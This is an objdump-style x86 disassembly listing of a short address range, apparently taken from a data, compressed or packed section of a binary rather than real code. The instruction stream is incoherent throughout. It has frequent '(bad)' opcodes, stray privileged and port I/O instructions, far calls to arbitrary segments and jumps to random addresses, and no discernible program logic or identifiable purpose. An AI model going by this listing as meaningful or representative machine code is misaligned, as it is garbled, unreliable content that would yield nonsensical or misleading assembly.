  427c8e:	rol    BYTE PTR [edx+0x2da5b62d],cl
  427c94:	les    ebx,FWORD PTR ds:0x7ba6c7e9
  427c9a:	adc    dh,BYTE PTR [ecx-0x3899b784]
  427ca0:	fld    TBYTE PTR [eax+0x6]
  427ca3:	dec    edi
  427ca4:	xchg   di,ax
  427ca6:	jno    0x427cff
  427ca8:	icebp  
  427ca9:	ficom  WORD PTR [edi-0x5b]
  427cac:	add    DWORD PTR [edi-0x23],0x18
  427cb0:	mov    ds:0x9d8c1e7d,al
  427cb5:	cmp    al,0x50
  427cb7:	daa    
  427cb8:	push   esi
  427cb9:	cmp    bl,BYTE PTR ds:0xb7fc63d1
  427cbf:	jo     0x427d0c
  427cc1:	cs jecxz 0x427c92
  427cc4:	add    DWORD PTR [esi-0xf222dd5],esp
  427cca:	sbb    DWORD PTR [esp+ecx*8+0x4503e970],0xfb23e8a5
  427cd5:	and    al,BYTE PTR [esi]
  427cd7:	adc    eax,0x31b08df0
  427cdc:	sub    BYTE PTR [esi-0x7abf2c8a],dl
  427ce2:	(bad)  
  427ce3:	lock and esi,DWORD PTR [ecx-0x74]
  427ce7:	and    eax,0x52071d0
  427cec:	jmp    0x427d31
  427cee:	mov    bh,0x7f
  427cf0:	mov    eax,0xbf4049ef
  427cf5:	imul   DWORD PTR [esi-0x78]
  427cf8:	add    eax,0x7f7b001b
  427cfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427cfe:	push   esp
  427cff:	inc    esi
  427d00:	cmp    al,0x86
  427d02:	add    DWORD PTR ds:0x6acbeac,0xe5f9b863
  427d0c:	xchg   BYTE PTR ds:0xeba2444,dh
  427d12:	push   ebp
  427d13:	ret    
  427d14:	bound  esp,QWORD PTR [eax+0x31]
  427d17:	mov    cs,WORD PTR [edi+0x67]
  427d1a:	sbb    dl,ah
  427d1c:	push   ds
  427d1d:	in     eax,dx
  427d1e:	test   DWORD PTR [ebx+ebp*4-0x59],edi
  427d22:	sti    
  427d23:	xchg   ecx,eax
  427d24:	fwait
  427d25:	inc    eax
  427d26:	push   esi
  427d27:	xor    DWORD PTR [edx],edx
  427d29:	jl     0x427cce
  427d2b:	sub    BYTE PTR [edi-0x7a],dl
  427d2e:	pushf  
  427d2f:	push   edx
  427d30:	int    0x5c
  427d32:	sbb    al,0xab
  427d34:	imul   bh
  427d36:	mov    BYTE PTR [ecx-0x5b],0x73
  427d3a:	sahf   
  427d3b:	push   0x29
  427d3d:	cvtpi2ps xmm3,QWORD PTR [edx]
  427d40:	(bad)  
  427d41:	sbb    dh,BYTE PTR [ebx-0x6386550a]
  427d47:	int    0x6b
  427d49:	retf   
  427d4a:	out    0x37,eax
  427d4c:	call   FWORD PTR [ecx+0x7]
  427d4f:	sar    esi,1
  427d51:	shr    DWORD PTR [edi-0x73],cl
  427d54:	jmp    0xa180d2ba
  427d59:	scas   al,BYTE PTR es:[edi]
  427d5a:	xchg   ecx,eax
  427d5b:	xchg   ebx,eax
  427d5c:	pop    ebx
  427d5d:	gs mov al,0xef
  427d60:	jae    0x427d8d
  427d62:	xlat   BYTE PTR ds:[ebx]
  427d63:	inc    edx
  427d64:	int3   
  427d65:	int3   
  427d66:	sbb    eax,0x108f01f3
  427d6b:	adc    ebp,DWORD PTR [esp]
  427d6e:	popa   
  427d6f:	inc    esp
  427d70:	or     BYTE PTR [ebx-0xe],bh
  427d73:	adc    edx,DWORD PTR [edx]
  427d75:	scas   eax,DWORD PTR es:[edi]
  427d76:	sub    eax,0x217ed3fc
  427d7b:	mov    edi,0x1ad68dd7
  427d80:	jb     0x427d72
  427d82:	pushf  
  427d83:	and    bl,BYTE PTR ds:[edx-0x1be27151]
  427d8a:	pop    ss
  427d8b:	pop    edx
  427d8c:	jecxz  0x427d44
  427d8e:	jb     0x427d6a
  427d90:	mov    dl,0x25
  427d92:	push   ds
  427d93:	jbe    0x427d30
  427d95:	sbb    BYTE PTR [eax+0x369a7ec0],0x7c
  427d9c:	mov    DWORD PTR [ecx+0x78],ebx
  427d9f:	int    0xab
  427da1:	lea    ebx,[esi+ebx*4+0x6d]
  427da5:	xchg   ebp,eax
  427da6:	xor    edi,DWORD PTR [edi+edi*4+0x39d365a5]
  427dad:	popa   
  427dae:	pop    ecx
  427daf:	add    ebp,DWORD PTR es:[eax+0x452ccbec]
  427db6:	xor    eax,0x989c988
  427dbb:	retf   0x19d
  427dbe:	jo     0x427dd5
  427dc0:	int3   
  427dc1:	mov    al,0x7e
  427dc3:	and    bl,dl
  427dc5:	mov    dh,0xb2
  427dc7:	loop   0x427d79
  427dc9:	xchg   edi,eax
  427dca:	mov    ebp,0x606bc023
  427dcf:	ror    DWORD PTR [ebp+0x1ef6c8c3],cl
  427dd5:	pop    es
  427dd6:	nop
  427dd7:	test   DWORD PTR [ecx+0x68],edx
  427dda:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  427ddc:	add    DWORD PTR [ebp+edx*2+0x751601f7],0xbf0acaf9
  427de7:	lods   eax,DWORD PTR ds:[esi]
  427de8:	int    0xf9
  427dea:	sub    bl,BYTE PTR [eax+ebp*1-0x6c]
  427dee:	mov    bl,0xa5
  427df0:	sbb    al,0x26
  427df2:	push   eax
  427df3:	push   0x49
  427df5:	jg     0x427e47
  427df7:	jae    0x427e04
  427df9:	sbb    DWORD PTR [ebx-0x707d6df1],esp
  427dff:	xchg   ecx,eax
  427e00:	gs jns 0x427daf
  427e03:	push   0x2630938d
  427e08:	dec    ebx
  427e09:	jecxz  0x427e09
  427e0b:	sbb    eax,0xb63e8d69
  427e10:	and    al,0xf5
  427e12:	(bad)  
  427e13:	jb     0x427e07
  427e15:	dec    ebp
  427e16:	shl    DWORD PTR [ebx-0x63cd0c05],0xdf
  427e1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427e1e:	xchg   esi,eax
  427e1f:	test   al,0x9b
  427e21:	clc    
  427e22:	arpl   WORD PTR [ebp-0x4a],bp
  427e25:	lods   al,BYTE PTR ds:[esi]
  427e26:	ret    0xff7b
  427e29:	shl    ebp,cl
  427e2b:	or     DWORD PTR [ebp-0x5c],edx
  427e2e:	sbb    eax,DWORD PTR ds:0x400416eb
  427e34:	xchg   esi,eax
  427e35:	outs   dx,BYTE PTR ds:[esi]
  427e36:	nop
  427e37:	fwait
  427e38:	out    dx,eax
  427e39:	rcr    BYTE PTR [ecx-0x50],1
  427e3c:	push   ecx
  427e3d:	cmp    al,0x3f
  427e3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e40:	mov    ds:0xd08118aa,eax
  427e45:	gs push 0x35
  427e48:	cmp    eax,0xddf740a6
  427e4d:	mov    cl,BYTE PTR ds:0x95ff06cc
  427e53:	shr    BYTE PTR [ecx],cl
  427e55:	inc    esi
  427e56:	jmp    0x766440b
  427e5b:	je     0x427dde
  427e5d:	in     al,0x7b
  427e5f:	adc    al,0x93
  427e61:	xchg   DWORD PTR [edi+0x3d13f7d0],edi
  427e67:	and    BYTE PTR [ebx],bh
  427e69:	add    cl,bh
  427e6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427e6c:	jg     0x427ea3
  427e6e:	call   0x2289:0x9620f5bb
  427e75:	mov    al,0xbe
  427e77:	rcr    DWORD PTR [ebx+0x3],0xef
  427e7b:	cld    
  427e7c:	mov    bh,0x14
  427e7e:	es in  al,dx
  427e80:	(bad)  
  427e81:	mov    cl,0xc4
  427e83:	xchg   ecx,eax
  427e84:	stc    
  427e85:	enter  0xa9fc,0x45
  427e89:	jmp    0x427e32
  427e8b:	jb     0x427e4f
  427e8d:	mov    ecx,0xb3764f19
  427e92:	inc    edi
  427e93:	pop    ecx
  427e94:	mov    ch,0xcf
  427e96:	iret   
  427e97:	(bad)  
  427e98:	push   ss
  427e99:	dec    ebx
  427e9b:	bound  esp,QWORD PTR [edi-0x31b3b6f4]
  427ea1:	sbb    ebp,edx
  427ea3:	fnsave [ebp+0x74]
  427ea6:	mov    dh,0x1b
  427ea8:	gs jg  0x427efc
  427eab:	in     eax,dx
  427eac:	adc    al,0x13
  427eae:	ror    eax,1
  427eb0:	and    eax,0x6b7ca607
  427eb5:	dec    esi
  427eb6:	vpunpckhwd ymm3,ymm1,YMMWORD PTR [ecx+ebx*4]
  427ebb:	push   es
  427ebc:	mov    ecx,0xa10f91fc
  427ec1:	pop    ss
  427ec2:	jne    0x427ebb
  427ec4:	mov    ch,0x32
  427ec6:	and    eax,0xc3ae1d6e
  427ecb:	das    
  427ecc:	enter  0x28cb,0x3a
  427ed0:	data16 (bad) 
  427ed3:	xor    eax,0x25644769
  427ed8:	pop    ds
  427ed9:	(bad)  [edx-0x7d]
  427edc:	add    al,0x4
  427ede:	and    bh,BYTE PTR [edi]
  427ee0:	neg    bh
  427ee2:	mov    cs,WORD PTR [ebx+ebx*8]
  427ee5:	adc    BYTE PTR ds:0xee80e44f,bh
  427eeb:	test   eax,0xfa17d6ec
  427ef0:	leave  
  427ef1:	lods   al,BYTE PTR ds:[esi]
  427ef2:	je     0x427ec1
  427ef4:	sbb    al,0x1c
  427ef6:	sar    BYTE PTR [edi-0x67],1
  427ef9:	daa    
  427efa:	fld    st(7)
  427efc:	mov    ecx,0x775256df
  427f01:	in     eax,0x21
  427f03:	cmc    
  427f04:	xchg   BYTE PTR [ebx],dl
  427f06:	fisttp WORD PTR [eax]
  427f08:	mov    dh,0x1e
  427f0a:	xlat   BYTE PTR ds:[ebx]
  427f0b:	mov    al,ds:0x29d17811
  427f10:	sbb    BYTE PTR [ebp-0x10],ch
  427f13:	popa   
  427f14:	add    ch,BYTE PTR [ebx-0x52]
  427f17:	scas   al,BYTE PTR es:[edi]
  427f18:	sub    al,0x5b
  427f1a:	push   ds
  427f1b:	jg     0x427f7f
  427f1d:	shr    BYTE PTR [edi],1
  427f1f:	or     al,0xd6
  427f21:	iret   
  427f22:	sti    
  427f23:	dec    ecx
  427f24:	fnstenv [edx-0x716e3921]
  427f2a:	ins    DWORD PTR es:[edi],dx
  427f2b:	fcomp  QWORD PTR [ecx+edi*8]
  427f2e:	push   eax
  427f2f:	pop    esi
  427f30:	pop    edi
  427f31:	pop    ebx
  427f32:	fimul  DWORD PTR [edx-0x557580a1]
  427f38:	sbb    DWORD PTR [eax-0xd],edx
  427f3b:	into   
  427f3c:	adc    DWORD PTR [ecx+0x4f],edi
  427f3f:	test   DWORD PTR [ecx-0x4e90cc74],edx
  427f45:	imul   ecx,DWORD PTR [eax],0xffffffa4
  427f48:	mov    esi,0x5967ac3d
  427f4d:	mov    ah,0x60
  427f4f:	mov    WORD PTR [edi+0x3888d7],fs
	...
  427f61:	mov    ah,0x8b
  427f63:	(bad)
  427f66:	fbstp  TBYTE PTR [esi-0x1e57cf15]
  427f6c:	mov    ebx,0x424c95ac
  427f71:	into   
  427f72:	hlt    
  427f73:	add    DWORD PTR [eax],eax
  427f75:	test   al,0x3
  427f77:	add    BYTE PTR [eax],al
  427f79:	mov    esi,DWORD PTR [ebp+0x2c]
  427f7c:	and    al,0x6b
  427f7e:	mov    ebp,0x67bfb74
  427f83:	jbe    0x427fdb
  427f85:	test   al,0x49
  427f87:	bnd jle 0x427f47
  427f8a:	out    dx,al
  427f8b:	outs   dx,BYTE PTR ds:[esi]
  427f8c:	call   0xb9245c2c
  427f91:	ins    DWORD PTR es:[edi],dx
  427f92:	mov    esi,0xba9e24d
  427f97:	jb     0x427fe5
  427f99:	in     eax,0xab
  427f9b:	fisttp QWORD PTR [esi-0x8]
  427f9e:	inc    ebx
  427f9f:	push   ebx
  427fa0:	repz test al,0x1c
  427fa3:	sahf   
  427fa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427fa5:	push   edi
  427fa6:	mov    ebx,0xd9921956
  427fab:	inc    ebp
  427fac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427fad:	push   esi
  427fae:	and    edx,ebx
  427fb0:	add    ebp,DWORD PTR [eax-0x6c3dd457]
  427fb6:	daa    
  427fb7:	jg     0x427ffd
  427fb9:	iret   
  427fba:	out    dx,eax
  427fbb:	xchg   ecx,eax
  427fbc:	or     eax,0x816c5b9a
  427fc1:	sub    cl,BYTE PTR [edi-0x527a7d9a]
  427fc7:	sbb    eax,edi
  427fc9:	inc    eax
  427fca:	repnz xor al,0xd7
  427fcd:	sub    DWORD PTR [ebp+0x2c],edi
  427fd0:	ins    DWORD PTR es:[edi],dx
  427fd1:	sbb    edi,DWORD PTR [edi-0x1c]
  427fd4:	ret    0xa0d0
  427fd7:	mov    BYTE PTR [ebp+0x40292d24],ah
  427fdd:	test   BYTE PTR [esi-0x59e51da6],dl
  427fe3:	dec    esp
  427fe4:	xchg   edx,eax
  427fe5:	retf   0xa3e2
  427fe8:	les    ebx,FWORD PTR [ecx-0x131b0c9c]
  427fee:	clc    
  427fef:	or     ebp,DWORD PTR [ecx-0x77899ef3]
  427ff5:	xor    al,0x22
  427ff7:	cmp    BYTE PTR [esi+0x10],dl
  427ffa:	cmc    
  427ffb:	mov    esi,0x644f82ad
  428000:	add    edx,DWORD PTR [edi-0x1d989169]
  428006:	mov    ebx,0x1dc4a546
  42800b:	lahf   
  42800c:	pmulhw mm4,mm4
  42800f:	(bad)  
  428010:	and    dl,dl
  428012:	mov    ch,0xd5
  428014:	test   eax,0x58cb64da
  428019:	mov    ebp,0x81f209a
  42801e:	or     BYTE PTR [ecx+ebx*1],bl
  428021:	push   ds
  428022:	sub    bl,cl
  428024:	push   ecx
  428025:	popa   
  428026:	mov    bl,0xa9
  428028:	mov    edx,0x96f6a182
  42802d:	push   esp
  42802e:	push   cs
  42802f:	mov    edi,0xc00c8f1b
  428034:	sub    DWORD PTR [ebx+0x592662d6],ecx
  42803a:	and    BYTE PTR [ebx-0x3d185a79],al
  428040:	dec    esp
  428041:	adc    ecx,edx
  428043:	xcrypt-ctr (bad)
  428044:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428045:	pop    eax
  428046:	int    0x98
  428048:	xor    dl,BYTE PTR [edx-0x31]
  42804b:	inc    eax
  42804c:	mov    bh,0x44
  42804e:	and    al,0xb5
  428050:	lea    eax,[esi-0x6b]
  428053:	call   DWORD PTR [ecx]
  428055:	pop    esi
  428056:	dec    ebp
  428057:	lods   al,BYTE PTR ds:[esi]
  428058:	aad    0xe4
  42805a:	ja     0x428060
  42805c:	cwde   
  42805d:	sbb    BYTE PTR [esi],dl
  42805f:	int    0xf3
  428061:	fs in  eax,0x65
  428064:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428065:	int3   
  428066:	enter  0x516a,0xe0
  42806a:	xchg   DWORD PTR [edi],esi
  42806c:	addr16 push esi
  42806e:	mov    bl,0x52
  428070:	ficom  DWORD PTR [edi-0x35d44893]
  428076:	mov    WORD PTR [edi-0x40],ds
  428079:	pop    eax
  42807a:	and    eax,0x46731e9c
  42807f:	pop    esp
  428080:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428081:	fmul   DWORD PTR [eax-0x433d399e]
  428087:	cwde   
  428088:	dec    ebp
  428089:	(bad)  
  42808a:	sar    BYTE PTR [ecx-0x1b695369],cl
  428090:	cmp    DWORD PTR [ebx],esi
  428092:	mov    al,ds:0x180d2a71
  428097:	and    esp,0x4f
  42809a:	dec    esi
  42809b:	jae    0x42802b
  42809d:	mov    DWORD PTR [eax],ebx
  42809f:	push   ebx
  4280a0:	adc    esp,ebx
  4280a2:	inc    ecx
  4280a3:	xchg   DWORD PTR [ebp+0x37103d69],ecx
  4280a9:	push   ds
  4280aa:	in     al,dx
  4280ab:	cmp    DWORD PTR [ebp+0x7e9bd754],edi
  4280b1:	into   
  4280b2:	and    BYTE PTR [edx+0x2d975a33],bl
  4280b8:	shr    BYTE PTR ds:0x8a8b46f4,1
  4280be:	daa    
  4280bf:	sahf   
  4280c0:	call   0xaa04:0xf3dcdc63
  4280c7:	mov    al,0xef
  4280c9:	lods   al,BYTE PTR ds:[esi]
  4280ca:	sub    BYTE PTR ds:0x8666a962,bl
  4280d0:	mov    ds:0x3c341735,al
  4280d5:	stc    
  4280d6:	dec    esi
  4280d7:	call   0x6c292ff5
  4280dc:	pop    ebp
  4280dd:	jae    0x4280ab
  4280df:	loop   0x428111
  4280e1:	or     eax,0xd8747650
  4280e6:	fidivr DWORD PTR [ebx-0x62e0165f]
  4280ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4280ed:	cmp    ebx,DWORD PTR [ebx+ecx*1+0x73]
  4280f1:	test   al,0x28
  4280f3:	mov    edx,0xfd844d57
  4280f8:	dec    eax
  4280f9:	jbe    0x4280ec
  4280fb:	dec    edi
  4280fc:	retf   0x2ed9
  4280ff:	xchg   esp,eax
  428100:	dec    eax
  428101:	imul   esi,esp,0x5a
  428104:	(bad)  
  428105:	jl     0x4280e8
  428107:	pop    es
  428108:	test   eax,0xfe1d0306
  42810d:	lock or edx,DWORD PTR [edi-0x6349923b]
  428114:	mov    bl,0x14
  428116:	sub    BYTE PTR [ebp+ecx*4+0x523783c4],bh
  42811d:	adc    eax,0x444c144
  428122:	test   DWORD PTR [edi],0x5e7b4616
  428128:	jne    0x4281a4
  42812a:	daa    
  42812b:	out    dx,al
  42812c:	ins    BYTE PTR es:[edi],dx
  42812d:	mov    cl,0x30
  42812f:	cwde   
  428130:	ror    edx,0x2b
  428133:	mov    bl,0x6
  428135:	mov    dl,BYTE PTR ss:[ecx-0x12]
  428139:	mov    edx,0x89074482
  42813e:	fcom   QWORD PTR [ebx-0x4f]
  428141:	dec    ebp
  428142:	cwde   
  428143:	and    eax,0xd0656c0f
  428148:	sahf   
  428149:	in     al,0x87
  42814b:	dec    ecx
  42814c:	in     al,0x9c
  42814e:	push   ecx
  42814f:	inc    ebx
  428150:	lods   eax,DWORD PTR ds:[esi]
  428151:	retf   
  428152:	jg     0x4280eb
  428154:	call   0xb79ed4
  428159:	inc    edx
  42815a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42815b:	mov    al,ds:0x8663ca91
  428160:	or     eax,0x4c6bef09
  428165:	push   ebx
  428166:	cld    
  428167:	xlat   BYTE PTR ds:[ebx]
  428168:	xor    edi,DWORD PTR [ebx+eiz*4-0x16dc7107]
  42816f:	cmp    ecx,esi
  428171:	pop    edi
  428172:	xchg   DWORD PTR [eax],esp
  428174:	and    ebp,edx
  428176:	shl    DWORD PTR [edi],1
  428178:	pop    eax
  428179:	fadd   QWORD PTR [edx]
  42817b:	sub    dl,BYTE PTR [eax]
  42817d:	xchg   ebx,eax
  42817e:	jne    0x42817a
  428180:	lea    edi,[esi+0x5e2cdd4d]
  428186:	mov    WORD PTR [ebx+0x1190861b],?
  42818c:	nop
  42818d:	and    bl,dl
  42818f:	sbb    BYTE PTR [ebx+0x632cbe81],dl
  428195:	xchg   cl,al
  428197:	pusha  
  428198:	dec    ecx
  428199:	pop    ecx
  42819a:	add    eax,0xa91d7801
  42819f:	push   esp
  4281a0:	cli    
  4281a1:	add    eax,0x684ef1f3
  4281a6:	fidivr DWORD PTR [edx]
  4281a8:	out    dx,eax
  4281a9:	les    edx,FWORD PTR [ebx-0xd]
  4281ac:	mov    cl,0x3d
  4281ae:	xchg   ecx,eax
  4281af:	pop    ebp
  4281b0:	push   ecx
  4281b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4281b2:	and    ecx,DWORD PTR [edi+0x12ac7642]
  4281b8:	fwait
  4281b9:	mov    ebx,DWORD PTR [eax-0x121684f3]
  4281bf:	nop
  4281c0:	out    0x61,al
  4281c2:	data16 fst QWORD PTR [edx+0x1e]
  4281c6:	stos   DWORD PTR es:[edi],eax
  4281c7:	shl    BYTE PTR [esi],0x68
  4281ca:	sbb    eax,DWORD PTR [esp+ecx*4+0x40]
  4281ce:	dec    eax
  4281cf:	push   edx
  4281d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4281d1:	mov    ds,WORD PTR [ebx-0x58]
  4281d4:	or     al,0xc6
  4281d6:	loop   0x42818f
  4281d8:	call   0x98c10423
  4281dd:	mov    DWORD PTR [esi-0x3c4f3fbc],ebp
  4281e3:	lds    eax,FWORD PTR ds:0x1aa422eb
  4281e9:	ins    DWORD PTR es:[edi],dx
  4281ea:	xor    al,0x6b
  4281ec:	sub    ebp,edi
  4281ee:	mov    ds:0xf732d88,al
  4281f3:	xor    esp,DWORD PTR [edi-0x22]
  4281f6:	arpl   WORD PTR [edi+ebx*1],cx
  4281f9:	push   eax
  4281fa:	cli    
  4281fb:	stc    
  4281fc:	mov    DWORD PTR [edi-0x58],ebx
  4281ff:	sets   dh
  428202:	cdq    
  428203:	popa   
  428204:	jbe    0x42825d
  428206:	mov    ecx,0x611c75
  42820b:	push   edx
  42820c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42820d:	sub    eax,0x9f3586b4
  428212:	enter  0x65b5,0x64
  428216:	fsubrp st(4),st
  428218:	xchg   ebp,eax
  428219:	les    ecx,FWORD PTR [ebp-0x4e]
  42821c:	je     0x428212
  42821e:	mov    ebp,0xc4478303
  428223:	cdq    
  428224:	pop    edi
  428225:	push   edx
  428226:	icebp  
  428227:	call   0x5260:0x72a533f3
  42822e:	data16 test al,0x26
  428231:	int    0xfc
  428233:	mov    dh,0x4d
  428235:	cwde   
  428236:	adc    DWORD PTR [ecx+0x3fc7a0cf],edx
  42823c:	arpl   WORD PTR [esi],bx
  42823e:	imul   DWORD PTR [eax+ebp*1+0x44b9e3c3]
  428245:	or     al,0x25
  428247:	push   cs
  428248:	inc    edx
  428249:	mov    BYTE PTR [ebp-0x6c058a42],al
  42824f:	pop    ss
  428250:	ja     0x428225
  428252:	jmp    0x4b10745c
  428257:	push   cs
  428258:	aam    0x4b
  42825a:	stos   DWORD PTR es:[edi],eax
  42825b:	lock aas 
  42825d:	stos   DWORD PTR es:[edi],eax
  42825e:	xchg   BYTE PTR [edx],dh
  428260:	lea    esi,[ecx]
  428262:	dec    ecx
  428263:	cld    
  428264:	test   DWORD PTR [edx+0x79],0xbd3e881e
  42826b:	pop    es
  42826c:	rol    BYTE PTR [ecx-0x61002eed],0x75
  428273:	es mov cl,0x52
  428276:	push   ebx
  428277:	dec    edi
  428279:	cmp    BYTE PTR [edx-0x5ba06d5b],ch
  42827f:	daa    
  428280:	mov    BYTE PTR [ebx+0x47a0a96c],cl
  428286:	out    dx,eax
  428287:	mov    edx,0x1652b2f7
  42828c:	and    eax,0x8501e04c
  428291:	data16 aam 0xfb
  428294:	add    BYTE PTR [esi-0x76e8cde1],al
  42829a:	mov    dl,0x59
  42829c:	imul   eax,DWORD PTR [edi],0xf1323c2c
  4282a2:	or     esp,DWORD PTR [edi]
  4282a4:	test   DWORD PTR [eax+0x65],esp
  4282a7:	and    eax,0x8f48884d
  4282ac:	add    dl,BYTE PTR [ecx-0x1e]
  4282af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4282b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4282b1:	inc    ebp
  4282b2:	dec    ecx
  4282b3:	ins    DWORD PTR es:[edi],dx
  4282b4:	pop    ebx
  4282b5:	arpl   WORD PTR [edx],cx
  4282b7:	leave  
  4282b8:	cmc    
  4282b9:	shr    DWORD PTR [eax+ecx*2+0x5afff514],cl
  4282c0:	mov    ds:0xc6312207,eax
  4282c5:	jg     0x428292
  4282c7:	xchg   esp,edx
  4282c9:	lds    eax,FWORD PTR [eax]
  4282cb:	mov    cl,0x4e
  4282cd:	sbb    al,0xfb
  4282cf:	test   al,0x65
  4282d1:	gs pop eax
  4282d3:	cdq    
  4282d4:	data16 sbb bh,BYTE PTR [ecx+0xc77fb1b]
  4282db:	mov    WORD PTR [eax],es
  4282dd:	data16 hlt 
  4282df:	inc    esi
  4282e0:	inc    edi
  4282e1:	add    ebp,DWORD PTR [edi-0xb]
  4282e4:	lds    ebp,FWORD PTR [ecx+0x4bee6c8f]
  4282ea:	push   eax
  4282eb:	dec    ecx
  4282ec:	clc    
  4282ed:	stos   BYTE PTR es:[edi],al
  4282ee:	sbb    ebp,DWORD PTR [ecx+0x39614d69]
  4282f4:	push   0xfffffffd
  4282f6:	scas   eax,DWORD PTR es:[edi]
  4282f7:	xchg   edx,eax
  4282f8:	rol    DWORD PTR [edx],0x1
  4282fb:	lods   eax,DWORD PTR ds:[esi]
  4282fc:	xchg   ebp,eax
  4282fd:	pop    es
  4282fe:	fstp   QWORD PTR [ecx]
  428300:	sbb    BYTE PTR ds:0x3b6dca0d,dh
  428306:	or     ecx,DWORD PTR [eax+ecx*1-0x836a461]
  42830d:	lahf   
  42830e:	pop    ebp
  42830f:	lahf   
  428310:	icebp  
  428311:	or     DWORD PTR [eax+0x79],eax
  428314:	pop    ebx
  428315:	lods   eax,DWORD PTR ds:[esi]
  428316:	pop    ecx
  428317:	(bad)  
  428318:	jecxz  0x4282ef
  42831a:	int    0xc3
  42831c:	jb     0x42834d
  42831e:	(bad)  
  42831f:	rcl    BYTE PTR [esi],cl
	...
